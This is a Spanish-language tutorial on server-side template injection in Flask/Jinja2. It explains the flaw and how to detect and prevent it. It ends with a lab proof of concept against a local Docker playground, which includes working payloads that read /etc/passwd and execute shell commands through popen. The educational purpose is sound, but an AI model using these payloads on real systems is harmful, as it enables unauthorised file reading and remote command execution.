# Server-Side Template Injection (SSTI)

El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.

Las plantillas de servidor son archivos que contienen código que se utiliza para generar **contenido dinámico** en una aplicación web. Los atacantes pueden aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en una plantilla de servidor, lo que les permite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la aplicación web como a posibles datos sensibles.

Por ejemplo, imagina que una aplicación web utiliza plantillas de servidor para generar correos electrónicos personalizados. Un atacante podría aprovechar una vulnerabilidad de **SSTI** para inyectar código malicioso en la plantilla de correo electrónico, lo que permitiría al atacante ejecutar comandos en el servidor y obtener acceso no autorizado a los datos sensibles de la aplicación web.

En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como **WhatWeb**. Si un atacante detecta que una aplicación **Flask** está en uso, puede intentar explotar una vulnerabilidad de **SSTI**, ya que Flask utiliza el motor de plantillas **Jinja2**, que es vulnerable a este tipo de ataque.

Para los atacantes, detectar una aplicación Flask o Python puede ser un primer paso en el proceso de intentar explotar una vulnerabilidad de SSTI. Sin embargo, los atacantes también pueden intentar identificar vulnerabilidades de SSTI en otras aplicaciones web que utilicen diferentes frameworks de plantillas, como Django, Ruby on Rails, entre otros.

Para prevenir los ataques de SSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y frameworks de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.

### Prueba de concepto SSTI

* Creación del contenedor con docker:

```bash
❯ docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
```

* Prueba para ver si es **vulnerable** a **SSTI**

**➜** `http://localhost:8089/?user={{2*2}}`:

Mas información en **➜** [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

* Leer archivo interno de la máquina:

**➜** `http://localhost:8089/?user={{%20get_flashed_messages.__globals__.__builtins__.open(%22/etc/passwd%22).read()%20}}`

* Ejecutar comandos remotamente a tráves del SSTI:

**➜** `http://localhost:8089/?user={{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27whoami%27).read()%20}}`
